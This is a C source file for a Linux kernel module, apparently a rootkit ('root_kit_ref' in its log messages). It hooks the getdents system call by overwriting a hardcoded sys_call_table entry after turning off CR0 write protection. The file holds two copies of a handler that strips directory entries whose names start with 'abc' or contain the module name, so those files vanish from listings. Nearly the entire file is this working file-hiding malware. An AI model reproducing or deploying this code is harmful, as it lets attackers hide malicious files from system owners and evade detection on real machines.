#include <linux/kernel.h>
#include <linux/module.h>
#include <asm/unistd.h>
#include <linux/highmem.h>
#include <linux/semaphore.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <linux/kallsyms.h>
#include <asm/special_insns.h>
#include <linux/string.h>
#include <linux/fs.h>

MODULE_AUTHOR("Abikamet Nathan");
MODULE_LICENSE("GPL");

#define SYS_ENTRY 78 
#define DISABLE (write_cr0(read_cr0() & (~ 0x10000)))
#define ENABLE (write_cr0(read_cr0() | (0x10000)))
#define HIDE_PREFIX "abc"
#define MODULE_NAME "syscall_intercept"
#define HIDE_PREFIX_SZ (sizeof(HIDE_PREFIX)-1)

//SYSCALL INTERCEPT:
int level;
typedef struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned long d_reclen;
	char d_name [128];
}Dirent;

void **sys_call_table; 
asmlinkage long (*original_getdents) (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);


// our new getdents handler
asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
        int boff;
        struct linux_dirent* ent;
        long ret = original_getdents(fd, dirent, count);
        printk("root_kit_ref : sys_getdents_new :  number of bytes returned by getdents() : %ld\n",ret);
        //long ret = original_getdents(fd, dirent, count);
        char* dbuf;
        int dir_number=1;
        if (ret <= 0) {
                return ret;
        }   
        dbuf = (char*)dirent;
        // go through the entries, looking for one that has our prefix
        for (boff = 0; boff < ret;) {
                ent = (struct linux_dirent*)(dbuf + boff);
                printk("root_kit_ref : sys_getdents_new : size of dirent struct no %d: %ld\n",dir_number,ent->d_reclen);
                if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) // if it has the hide prefix
                        || (strstr(ent->d_name, MODULE_NAME) != NULL)) {     // or if it has the module name anywhere in it
                        // remove this entry by copying everything after it forward
                        printk("root_kit_ref : sys_getdents_new : if block : dirent char contents : %s\n",ent->d_name);
                        memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
                        // and adjust the length reported
                       dir_number++;
                        ret -= ent->d_reclen;
                } else {
                        // on to the next entry
                        printk("root_kit_ref : sys_getdents_new : else block : dirent char contents : %s\n",ent->d_name);
                        boff += ent->d_reclen;
                        dir_number++;
                }   
        }   
        return ret;
}


asmlinkage long our_fake_getdents_function(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{


#if 0 
	/*print message on console every time we
	*are called*/
	//printk("GETDENTS INTERCEPTED!!\n");
  	struct linux_dirent *dirent;
	long ret = original_getdents(fd, dirp, count);	
	char* dirent_buffer;
	int dir_offset=0;
	if(ret <= 0){
		return ret;
	}		
	/*call the original sys_exit*/
	dirent_buffer = (char *)dirp;
	for(dir_offset=0;dir_offset<ret;){
		dirent = (struct linux_dirent *)(dirent_buffer+dir_offset);

		if ((strncmp(dirent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) || (strstr(dirent->d_name, MODULE_NAME) != NULL)) {
			printk("Inside if strncmp block\n");
			memcpy(dirent_buffer + dir_offset, dirent_buffer + dir_offset + dirent->d_reclen, ret - (dir_offset + dirent->d_reclen));
			ret -= dirent->d_reclen;
		} else {
			// on to the next entry

			dir_offset += dirent->d_reclen;
			printk("Inside else strncmp block dirent_char:%s\n",dirent->d_name);
		}

	}
#else

 int boff;
        struct linux_dirent* ent;
        long ret = original_getdents(fd, dirp, count);
        printk("root_kit_ref : sys_getdents_new :  number of bytes returned by getdents() : %ld\n",ret);
        //long ret = original_getdents(fd, dirent, count);
        char *dbuf;
        int dir_number=1;
        if (ret <= 0) {
                return ret;
        }   
        dbuf = (char*)dirp;
        // go through the entries, looking for one that has our prefix
        for (boff = 0; boff < ret;) {
                ent = (struct linux_dirent*)(dbuf + boff);
                printk("root_kit_ref : sys_getdents_new : size of dirent struct no %d: %ld\n",dir_number,ent->d_reclen);
                if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) // if it has the hide prefix
                        || (strstr(ent->d_name, MODULE_NAME) != NULL)) {     // or if it has the module name anywhere in it
                        // remove this entry by copying everything after it forward
                        printk("root_kit_ref : sys_getdents_new : if block : dirent char contents : %s\n",ent->d_name);
                        memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
                        // and adjust the length reported
                        dir_number++;
                        ret -= ent->d_reclen;
                } else {
                        // on to the next entry
                        printk("root_kit_ref : sys_getdents_new : else block : dirent char contents : %s\n",ent->d_name);
                        boff += ent->d_reclen;
                        dir_number++;
                }   
        }   


#endif
	return ret;
}

static int __init begin_module(void)
{
	printk(KERN_INFO "************************************MODULE LOAD*************************************");
	sys_call_table = (void**)0xffffffff81a001c0;
	DISABLE;
	original_getdents=(sys_call_table)[SYS_ENTRY];
	sys_call_table[SYS_ENTRY] = (void*)&sys_getdents_new;
	ENABLE;
	return 0;
}

static void __exit exit_module(void)
{
	DISABLE;
	sys_call_table[SYS_ENTRY] =(void*)original_getdents;
	printk(KERN_INFO "************************************MODULE UNLOAD*************************************");
	ENABLE;
}

module_init(begin_module);
module_exit(exit_module);

